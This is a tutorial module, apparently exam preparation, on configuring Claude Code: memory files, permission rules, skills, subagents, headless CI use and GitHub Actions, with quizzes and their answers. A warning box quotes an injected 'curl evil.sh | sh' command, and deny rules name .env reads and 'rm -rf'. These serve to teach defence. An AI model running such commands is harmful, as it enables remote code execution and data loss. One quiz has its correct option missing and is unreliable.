## 3.1 | Core components

Claude Code is Anthropic's **agentic coding tool**. It runs in your terminal, IDE, desktop app or browser, works directly in a repository, and loops through the same cycle you built in Module 1: read files, decide, run a tool (edit, search, run tests), check the result, continue. It isn't "Claude in a terminal": it's Claude inside a software engineering workflow, with configuration that shapes how it behaves.

```seq title="One request in Claude Code"
You, Claude Code, Repository
You -> Claude Code: "The login tests fail. Find out why and fix it."
Claude Code -> Repository: Grep and Read the auth module and the tests
Claude Code -> Repository: Bash: pytest tests/test_login.py
Repository --> Claude Code: 2 failures: token expiry compared in local time
Claude Code -> Repository: Edit auth/tokens.py (asks permission first)
Claude Code -> Repository: Bash: pytest (all pass)
Claude Code --> You: What was wrong, what changed, and the test result
```

### The building blocks, and when to use each

The exam blueprint names five core components (rules, skills, commands, agents and agent memory). Hooks and settings complete the picture. The skill being tested is choosing the right one for a need.

| Component | What it is | Use it for | Lives in |
|---|---|---|---|
| **CLAUDE.md** | Standing project instructions, loaded every session | Build and test commands, conventions, things to always know | `CLAUDE.md` at several levels (3.2) |
| **Rules** | Instructions in separate files, optionally limited to certain paths | Conventions that apply to part of the codebase ("in `api/`, ...") | `.claude/rules/*.md` |
| **Skills** | A packaged procedure with instructions and optional scripts, loaded only when relevant | Repeatable multi-step workflows: release notes, a migration checklist | `.claude/skills/<name>/SKILL.md` |
| **Slash commands** | Something you trigger explicitly by typing `/name` | Built-in operations (`/clear`, `/compact`) and your team's own shortcuts | Built in, or custom files you add |
| **Subagents** | Specialised assistants with their own prompt, tools and **own context window** | Independent or noisy work: a code reviewer, a test runner, a researcher | `.claude/agents/*.md` |
| **Agent memory** | What persists across sessions: CLAUDE.md you write, plus auto memory Claude saves as it works | Lessons learned, preferences, project facts | Memory files managed by Claude Code |
| **Hooks** | Your scripts, run at fixed points in the life cycle | Anything that must *always* happen or *never* happen | `settings.json` |
| **settings.json** | Configuration Claude Code enforces | Permissions, model, environment, hooks, plugins | `.claude/settings.json` and others |

> [concept] **Guidance or guarantee?** CLAUDE.md, rules, skills and commands are all *read by the model*: they make a behaviour likely. Hooks and `settings.json` permissions are *applied by Claude Code*: they make it certain. When a question says "must never" or "always, without exception", the answer is a hook or a permission rule.

### Skills load in stages

A skill's full instructions aren't put into every session. At start-up Claude Code loads only each skill's short **description**; the body is read when Claude decides the skill is relevant (or you call it by name), and any scripts or reference files inside it are read only if needed. That staged loading is why you can install many skills without filling the context window. Here's the arithmetic for a team with 25 skills.

```python
skills = 25
description_tokens = 60          # name + one-line description, always loaded
body_tokens = 2_500              # the full SKILL.md, loaded when used
reference_tokens = 6_000         # optional extra files and scripts, read only if needed
used_per_session = 2

always_on = skills * description_tokens
if_everything_loaded = skills * (description_tokens + body_tokens + reference_tokens)
typical = always_on + used_per_session * body_tokens

print(f"descriptions only (start of every session): {always_on:>7,} tokens")
print(f"typical session using {used_per_session} skills:            {typical:>7,} tokens")
print(f"if all 25 skills were loaded in full:       {if_everything_loaded:>7,} tokens")
```

> [read] Descriptions cost 1,500 tokens; a session that uses two skills about 6,500; loading everything up front would cost over 200,000. The flip side: Claude decides whether to use a skill **from its description alone**, so a vague description means a skill that never gets picked.

### Where does it go?

Here's the choice as a small decision function, run on eight real needs. The rules are a summary of the guidance above, not an official algorithm.

```python
def where_does_it_go(need):
    n = need.lower()
    if any(w in n for w in ("must never", "always block", "every time without fail", "after every edit")):
        return "hook (or a permission rule)"
    if any(w in n for w in ("allow", "deny", "which model", "environment variable")):
        return "settings.json"
    if any(w in n for w in ("only in", "files under", "for the api folder")):
        return "path-scoped rule"
    if any(w in n for w in ("own context", "independently", "in parallel", "separate reviewer")):
        return "subagent"
    if any(w in n for w in ("step-by-step procedure", "checklist", "workflow with scripts")):
        return "skill"
    if any(w in n for w in ("i type", "shortcut", "on demand")):
        return "custom slash command (or a skill you invoke)"
    return "CLAUDE.md"

needs = [
    "Run the formatter after every edit",
    "The test command is `pytest -q` and the app uses FastAPI",
    "Only in files under app/api/: return errors as RFC 7807 problem JSON",
    "A 9-step release checklist with a changelog script",
    "Review each PR with a separate reviewer that doesn't see the author's reasoning",
    "Must never read .env files",
    "A shortcut I type to summarise today's changes for stand-up",
    "Deny `git push --force` and allow `pytest`",
]
for need in needs:
    print(f"{where_does_it_go(need):<44} ← {need}")
```

```quiz
Q: A team wants Claude Code to follow a 12-step database migration procedure, with two helper scripts, whenever someone asks for a migration, but without loading those instructions into every unrelated session. What fits best?
- [ ] Put all 12 steps in the project CLAUDE.md
- [x] Package the procedure and scripts as a skill with a clear description
- [ ] A PreToolUse hook
- [ ] A permission rule in settings.json
why: A skill packages a reusable procedure with supporting files, and only its description is loaded until it's needed. CLAUDE.md is loaded into every session; hooks and permissions enforce actions rather than teaching a procedure.
```

```quiz
Q: Why delegate a large codebase search to a subagent rather than doing it in the main session?
- [ ] Subagents can use tools the main session can't

- [ ] Subagents are always cheaper because they use a smaller model
- [ ] Subagents remember earlier sessions automatically
why: Context isolation is the main benefit: the search output stays in the subagent's window. A subagent may use a cheaper model or a restricted tool set, but that's configuration, not the reason subagents exist.
```

## 3.2 | CLAUDE.md, settings and commands

### Starting a repository: /init

`/init` reads the codebase and drafts a `CLAUDE.md`: how to build and test, how the code is organised, and the conventions it spots. If a CLAUDE.md already exists, it suggests improvements instead of overwriting it. Treat the draft as a starting point: cut what's obvious from the code, and add what only your team knows.

### The CLAUDE.md hierarchy

CLAUDE.md files can sit at several levels. They don't override each other: Claude Code **combines** them, from the broadest down to the most specific, so a project file can add to (or refine) what a user file says.

| Level | Location | For | In Git? |
|---|---|---|---|
| **Managed policy** | Set by IT (e.g. `/Library/Application Support/ClaudeCode/CLAUDE.md` on macOS) | Organisation-wide rules | No: deployed centrally |
| **User** | `~/.claude/CLAUDE.md` | Your personal preferences, in every project | No |
| **Project** | `./CLAUDE.md` or `./.claude/CLAUDE.md` | Team conventions for the repo | **Yes** |
| **Local** | `./CLAUDE.local.md` | Your notes for this repo only | No: add to `.gitignore` |
| **Directory** | `some/folder/CLAUDE.md` | Conventions for one part of the repo | Yes |

When they load matters as much as where they are:

```flow title="When each CLAUDE.md enters the context"
At launch | Managed and user files, plus every CLAUDE.md (and CLAUDE.local.md) from the filesystem root down to the folder you started in.
On demand | A CLAUDE.md in a subfolder loads only when Claude reads or edits a file in that folder.
Imports | An @path/to/file line pulls another file in when the CLAUDE.md is loaded.
Every session | Starts fresh, so the files are reloaded each time; that's what makes them memory.
```

Here's that loading logic as code, run on a small monorepo. The tree is invented; the rules are the ones above.

```python
import posixpath as pp

FILES = {   # every CLAUDE.md-style file that exists on this machine
    "~/.claude/CLAUDE.md": "user: prefer British spelling; explain diffs briefly",
    "/work/CLAUDE.md": "work: all repos use pre-commit",
    "/work/clinic/CLAUDE.md": "project: FastAPI app; run `pytest -q`; dates as 30 Oct 2026",
    "/work/clinic/CLAUDE.local.md": "local (mine): my test DB is on port 5433",
    "/work/clinic/app/api/CLAUDE.md": "api: errors as RFC 7807 problem JSON",
    "/work/clinic/web/CLAUDE.md": "web: React + TypeScript, no default exports",
}

def ancestors(path):
    parts, out = path.strip("/").split("/"), []
    for i in range(len(parts) + 1):
        out.append("/" + "/".join(parts[:i]) if i else "/")
    return out

def loaded(start_dir, touched=()):
    order = ["~/.claude/CLAUDE.md"]
    for d in ancestors(start_dir):                              # root → start folder, at launch
        for name in ("CLAUDE.md", "CLAUDE.local.md"):
            p = pp.join(d, name)
            if p in FILES: order.append(p)
    for f in touched:                                           # subfolders, on demand
        d = pp.dirname(f)
        while d.startswith(start_dir) and d != start_dir:
            p = pp.join(d, "CLAUDE.md")
            if p in FILES and p not in order: order.append(p)
            d = pp.dirname(d)
    return order

print("Started in /work/clinic, nothing opened yet:")
for p in loaded("/work/clinic"): print("  ", FILES[p])
print("\n...then Claude edits app/api/bookings.py:")
for p in loaded("/work/clinic", ["/work/clinic/app/api/bookings.py"])[-1:]: print("  +", FILES[p])
```

> [read] The web folder's rules never load in this session because Claude never touched a file there. The work-level file loads even though it isn't in the repo, because it's in a parent folder of where Claude Code was started.

### Diagnosing "Claude ignores our conventions"

When a team convention seems to be ignored, the cause is usually *where* it was written, not the model.

| Symptom | Likely cause | Fix |
|---|---|---|
| Works for one developer, not the others | The rule is in that person's `~/.claude/CLAUDE.md` or `CLAUDE.local.md` | Move it to the project `CLAUDE.md` and commit it |
| A folder's rule is ignored at the start of a task | Subfolder files load only when Claude touches a file there | Put cross-cutting rules in the root file, or a path-scoped rule |
| Followed most of the time, but not always | Instructions are guidance, not enforcement | Turn "must" rules into hooks or permission rules |
| Followed loosely | Vague wording ("write clean code") | Make it specific and checkable ("functions under 40 lines; type hints on public functions") |
| Ignored in a long session | Context rot: the instruction is buried | `/clear` or `/compact`; keep CLAUDE.md short |

Use `/memory` to see which memory files are loaded and edit them, and `/context` to see what is taking up the context window.

### settings.json and permissions

Settings are the configuration Claude Code **applies itself**. Module 2 covered the files and their precedence: managed, then command line, then local project, then shared project, then user. For this module, focus on **permission rules**, the most tested part.

```file title=".claude/settings.json" lang=json
{
  "permissions": {
    "allow": ["Bash(pytest *)", "Bash(npm run lint)", "Read(./src/**)"],
    "ask":   ["Bash(git push *)", "WebFetch"],
    "deny":  ["Read(.env)", "Bash(rm -rf *)", "Edit(./migrations/**)"]
  }
}
```

Each rule is `Tool` or `Tool(specifier)`. For Bash, `Bash(npm run lint)` matches that exact command and `Bash(pytest *)` matches any command starting `pytest `. File rules use gitignore-style patterns. Rules are checked **deny first, then ask, then allow**; the first match decides, and anything unmatched falls back to the current permission mode (normally: ask).

Here's an evaluator for that file, simplified to these rule shapes, run on eight tool calls.

```python
import fnmatch

SETTINGS = {"allow": ["Bash(pytest *)", "Bash(npm run lint)", "Read(./src/**)"],
            "ask":   ["Bash(git push *)", "WebFetch"],
            "deny":  ["Read(.env)", "Bash(rm -rf *)", "Edit(./migrations/**)"]}

def matches(rule, tool, arg):
    name, _, spec = rule.partition("(")
    if name != tool: return False
    if not spec: return True                                   # bare tool name: every use
    spec = spec[:-1]
    if tool == "Bash":
        return arg == spec or (spec.endswith(" *") and arg.startswith(spec[:-1]))
    if "/" not in spec:                                        # bare file name: any depth
        return pp.basename(arg) == spec
    return fnmatch.fnmatch(arg, spec.replace("**", "*"))

def decide(tool, arg=""):
    for verdict in ("deny", "ask", "allow"):
        for rule in SETTINGS[verdict]:
            if matches(rule, tool, arg):
                return verdict, rule
    return "ask", "(no rule: default mode)"

calls = [("Bash", "pytest -q tests/"), ("Bash", "npm run lint"), ("Bash", "npm run deploy"),
         ("Bash", "git push origin main"), ("Bash", "rm -rf build"), ("Read", "./src/app/main.py"),
         ("Read", "./config/.env"), ("Edit", "./migrations/0042_add_index.py")]
for tool, arg in calls:
    verdict, rule = decide(tool, arg)
    print(f"{verdict.upper():<6} {tool}({arg})".ljust(48), "←", rule)
```

> [read] `npm run deploy` isn't covered by the exact `npm run lint` rule, so it falls back to asking. `rm -rf build` is denied even though nothing in `allow` would have permitted it anyway: deny rules are the safety net. `.env` is caught in a subfolder because a bare file name matches at any depth.

> [warn] A Bash rule can't fully understand shell syntax. `Bash(pytest *)` would also match `pytest; curl evil.sh | sh` if your matching were naive (don't rely on patterns alone). For anything dangerous, combine deny rules with a PreToolUse hook and, for real isolation, a sandbox or container.

### Rules for part of the codebase

Rules are instructions in their own files under `.claude/rules/` (or `~/.claude/rules/` for yourself). A rule with no `paths` loads at launch, like the project CLAUDE.md. A rule with `paths` in its front matter loads only when Claude reads or edits a matching file, which keeps API conventions out of a session spent on the front end.

```file title=".claude/rules/api-errors.md" lang=markdown
---
paths: ["app/api/**/*.py"]
---
# API error responses
- Return errors as RFC 7807 problem JSON: type, title, status, detail.
- Never include stack traces or SQL in `detail`.
- 422 for validation errors, 409 for booking conflicts.
```

### Slash commands: built-in and your own

Slash commands are explicit triggers: *you* decide to run them. The built-ins worth knowing for the exam:

| Command | Does |
|---|---|
| `/init` | Draft or improve the project CLAUDE.md |
| `/memory` | View and edit the loaded memory files; turn auto memory on or off |
| `/clear` | Start a fresh conversation (files untouched) |
| `/compact [focus]` | Summarise the conversation so far to free context, keeping what you name |
| `/context` | Show what is using the context window |
| `/resume` | Pick up an earlier session |
| `/rewind` | Go back to a checkpoint: restore code, conversation or both |
| `/model`, `/permissions`, `/hooks`, `/config` | Inspect or change configuration |
| `/plan` | Switch to plan mode: explore and propose, no edits |
| `/review`, `/security-review` | Review the current changes |
| `/cost` (or `/usage`) | Token use and estimated cost |

Your own commands are Markdown files. A file at `.claude/commands/standup.md` becomes `/standup`; the same front matter works for **skills**, which Anthropic now recommends for new work, because a skill can also be picked up automatically when relevant. Arguments arrive as `$ARGUMENTS` (everything you typed after the command) or `$0`, `$1`... for individual words.

```file title=".claude/skills/fix-issue/SKILL.md" lang=markdown
---
description: Fix a GitHub issue by number. Use when asked to fix, resolve or close an issue.
argument-hint: <issue-number>
allowed-tools: Bash(gh issue view *) Bash(pytest *) Read Edit
---
Fix issue #$ARGUMENTS.

1. Read it with `gh issue view $ARGUMENTS`.
2. Write a failing test that reproduces it.
3. Make the smallest change that passes the test; run the full suite.
4. Summarise the cause and the fix in under 100 words, ready for the PR description.
```

Here's what happens when you type `/fix-issue 214`: the arguments are substituted into the body, and that text becomes the instruction Claude works from.

```python
import re

SKILL = """Fix issue #$ARGUMENTS.

1. Read it with `gh issue view $ARGUMENTS`.
2. Write a failing test that reproduces it."""

def expand(body, typed):
    words = typed.split()
    body = body.replace("$ARGUMENTS", typed)
    return re.sub(r"\$(\d+)", lambda m: words[int(m.group(1))] if int(m.group(1)) < len(words) else "", body)

print(expand(SKILL, "214"))
print("\npositional form:", expand("Compare $0 with $1 and list breaking changes.", "v2.3 v3.0"))
```

### Subagents and agent memory

A subagent is a Markdown file with front matter: a name, a **description** (how Claude decides when to delegate), and optionally its tools, model and memory. It runs in **its own context window** and hands back only its final message.

```file title=".claude/agents/migration-reviewer.md" lang=markdown
---
name: migration-reviewer
description: Reviews Alembic migrations for locking, data loss and missing downgrades. Use after any change under migrations/.
tools: Read, Grep, Glob
model: haiku
memory: project
---
You review database migrations for a PostgreSQL booking system.
Flag: table rewrites on large tables, missing CONCURRENTLY on index builds,
NOT NULL without a default, irreversible downgrades. Report each finding with file:line.
Record recurring problems in your memory so future reviews check for them first.
```

**Agent memory** comes in two forms. **CLAUDE.md** is memory *you* write. **Auto memory** is memory *Claude* writes: notes it saves as it works (your preferences, corrections, project facts), stored per project under `~/.claude/projects/<project>/memory/` with a `MEMORY.md` index loaded at the start of each session. A subagent's `memory` field gives it its own memory directory (`project`, `user` or `local` scope), so a reviewer can learn across runs.

### Sessions and checkpoints

| Need | How |
|---|---|
| Continue the most recent session here | `claude --continue` (or `-c`) |
| Pick an older one | `claude --resume`, or `/resume`, by name or ID |
| Try an alternative without losing this path | Fork: `--fork-session` or `/branch` |
| Undo Claude's last edits | `/rewind` (or Esc twice): restore code, conversation, or both |

> [warn] Checkpoints track Claude's own file edits, not changes made through Bash commands or by other tools, and they're no substitute for Git. Commit before big changes.


## 3.3 | Headless mode and CI/CD

Claude Code is interactive by default: it expects a person to read, approve and reply. Three separate ideas cover running it any other way. They answer different questions, so a scenario may need one, two or all three.

| Idea | Question it answers | How |
|---|---|---|
| **Headless** (print mode) | Is a person at the keyboard? | `claude -p "..."`: run the task, print the result, exit |
| **Streaming output** | How is the output delivered? | `--output-format stream-json`: one JSON event per line, as it happens |
| **Auto mode** | Who approves each action? | `--permission-mode auto`: a classifier model approves or blocks actions |

### Permission modes

| Mode | Claude may, without asking | Typical use |
|---|---|---|
| `default` (manual) | Read files | Normal interactive work |
| `acceptEdits` | Read and edit files, simple file operations | Trusted refactors you'll review in the diff |
| `plan` | Read and explore; no edits until you approve a plan | Big or risky changes: agree the plan first |
| `auto` | Most actions; a separate classifier blocks risky ones (force pushes, `curl | bash`, production deploys, anything beyond your request) | Long tasks without constant prompts |
| `dontAsk` | Only what allow rules permit; everything else is denied, not asked | Locked-down scripts |
| `bypassPermissions` | Everything | Only inside an isolated container or VM |

> [warn] Anthropic's docs are explicit that auto mode **does not guarantee safety**: it's a classifier making judgement calls. For unattended runs, combine a narrow `--allowedTools` list, deny rules, hooks and an isolated environment. In the terminal, Shift+Tab cycles through the interactive modes.

### Print mode, step by step

```file title="Headless examples" lang=bash
# One question, plain text out
claude -p "Summarise what changed in the last 5 commits"

# Pipe input in
cat build-error.log | claude -p "Explain this build failure and the most likely fix"

# Machine-readable result, limited tools and turns
claude -p "Find unused functions in app/" \
  --output-format json \
  --allowedTools "Read" "Grep" "Glob" \
  --max-turns 15

# Output that must match a schema (lands in .structured_output)
claude -p "Review the diff in pr.diff" --output-format json --json-schema "$(cat findings.schema.json)"

# Continue a session non-interactively, adding to the system prompt
claude -p --resume "$SESSION_ID" "Now add tests" --append-system-prompt "Use pytest fixtures from conftest.py"

# Event-by-event output for a live log or another program
claude -p "Run the test suite and fix failures" --output-format stream-json --verbose
```

> [exam] A CI job that **hangs** is waiting for input that will never come: the fix is `-p`. Pipeline output that's **hard to parse** needs `--output-format json` (plus `--json-schema` for a fixed shape). A job that must not **run away** needs `--max-turns`, `--max-budget-usd` and a narrow `--allowedTools`.

### Using the JSON result in a script

With `--output-format json`, Claude Code prints one JSON object when it finishes. The shape below follows the documented result message (fields such as `result`, `session_id`, `is_error`, `num_turns` and `total_cost_usd`); it's our example, not a recorded run. The script logic is real.

```python
import json

raw = """{"type": "result", "subtype": "success", "is_error": false, "num_turns": 7,
  "session_id": "4f1c2a9e-example", "duration_ms": 48210, "total_cost_usd": 0.21,
  "result": "Found 3 unused functions.",
  "structured_output": {"findings": [
    {"file": "app/services/billing.py", "line": 88, "severity": "high",
     "message": "Refund amount not validated against the original charge"},
    {"file": "app/api/bookings.py", "line": 41, "severity": "medium",
     "message": "No 409 when the slot was taken between check and hold"},
    {"file": "app/utils/dates.py", "line": 12, "severity": "low",
     "message": "Unused helper `to_local_time`"}]}}"""

def ci_gate(raw, fail_on=("high",)):
    r = json.loads(raw)
    if r["is_error"] or r["subtype"] != "success":
        print(f"Claude run failed ({r['subtype']}): treat as a pipeline error, not a pass")
        return 2
    findings = r["structured_output"]["findings"]
    for f in findings:                    # each becomes an inline PR comment
        print(f"comment → {f['file']}:{f['line']}  [{f['severity']}] {f['message']}")
    blocking = [f for f in findings if f["severity"] in fail_on]
    print(f"\n{len(findings)} findings, {len(blocking)} blocking · {r['num_turns']} turns · "
          f"~${r['total_cost_usd']:.2f} (client-side estimate) · session {r['session_id']}")
    return 1 if blocking else 0

print("exit code:", ci_gate(raw))
print("exit code:", ci_gate('{"type": "result", "subtype": "error_max_turns", "is_error": true, "num_turns": 15}'))
```

> [read] The structured findings become inline comments, and only the high-severity one fails the build. The second run hit `--max-turns`: the script treats it as an error rather than "no findings", which is the bug that lets broken reviews pass silently.

### Generator and reviewer: separate sessions

A session that just wrote code carries its own reasoning in its context, and tends to agree with it. Run review as a **separate invocation** with a fresh context (and ideally a reviewer prompt or subagent), so it reads the change as a newcomer would.

```seq title="Code generation and review as separate Claude runs"
CI pipeline, Claude run A (writer), Claude run B (reviewer)
CI pipeline -> Claude run A (writer): claude -p "Implement issue #214" --permission-mode acceptEdits
Claude run A (writer) --> CI pipeline: diff + summary (session A)
CI pipeline -> Claude run B (reviewer): claude -p "Review this diff" --output-format json --json-schema ...
note Claude run B (reviewer): Fresh context: sees the diff, CLAUDE.md and the standards, not A's reasoning
Claude run B (reviewer) --> CI pipeline: structured findings → PR comments
```

> [tip] In CI, Claude Code still reads the repo's CLAUDE.md. That's where to put review criteria and testing standards (what makes a valuable test, which fixtures exist), so the CI instance applies the same standards as everyone else.

### GitHub Actions

The official action is `anthropics/claude-code-action`. The quickest setup is `/install-github-app` inside Claude Code, which installs the GitHub app, stores the API key as a repository secret and opens a PR with the workflow. This workflow responds when someone mentions `@claude` in a comment:

```file title=".github/workflows/claude.yml" lang=yaml
name: Claude Code
on:
  issue_comment:
    types: [created]
  pull_request_review_comment:
    types: [created]
jobs:
  claude:
    if: contains(github.event.comment.body, '@claude')
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
      issues: write
      id-token: write
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 1
      - uses: anthropics/claude-code-action@v1
        with:
          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
          claude_args: "--max-turns 20 --model claude-sonnet-5-5"
```

| Input | Purpose |
|---|---|
| `anthropic_api_key` | From a repository secret, never written into the YAML |
| `prompt` | When set, the action runs that task automatically instead of waiting for `@claude` |
| `claude_args` | Any CLI flags: `--max-turns`, `--model`, `--allowedTools`... |
| `use_bedrock` / `use_vertex` / `use_foundry` | Run through a cloud provider instead of the Claude API |

GitLab CI/CD support exists too (in beta, maintained by GitLab): a pipeline job installs Claude Code and runs `claude -p` with an allowed-tools list.

```quiz
Q: A nightly CI job runs `claude "Update the changelog"` and never finishes. What's the fix?
- [ ] Add `--verbose`
- [x] Run it in print mode with `claude -p`, so it completes the task and exits without waiting for input
- [ ] Switch to plan mode
- [ ] Add more detail to CLAUDE.md
why: Without `-p`, Claude Code starts an interactive session and waits for a person who will never arrive. Print mode processes the prompt, writes the result to stdout and exits.
```

```quiz
Q: A pipeline must post each of Claude's review findings as an inline PR comment. Which flags make that dependable? (Select 2)
- [x] `--output-format json`
- [x] `--json-schema` with a schema for the findings
- [ ] `--permission-mode bypassPermissions`
- [ ] `--continue`
why: JSON output makes the result machine-readable, and a schema fixes its shape so the script can rely on fields such as file, line and severity. Bypassing permissions adds risk and does nothing for the output format; `--continue` reuses a session, which is the opposite of what a review should do.
```

```quiz
Q: Why should the code review in a pipeline run as a separate Claude Code invocation from the one that wrote the code?
- [ ] Each invocation can only use one tool
- [ ] The reviewer needs a different API key
- [x] A fresh session doesn't carry the author's reasoning, so it is more likely to question the code
- [ ] Claude Code can't review its own diffs
why: The writer's session holds the reasoning behind its own decisions and tends to confirm them. A separate session, with only the diff and the standards, reviews the change the way an independent colleague would.
```
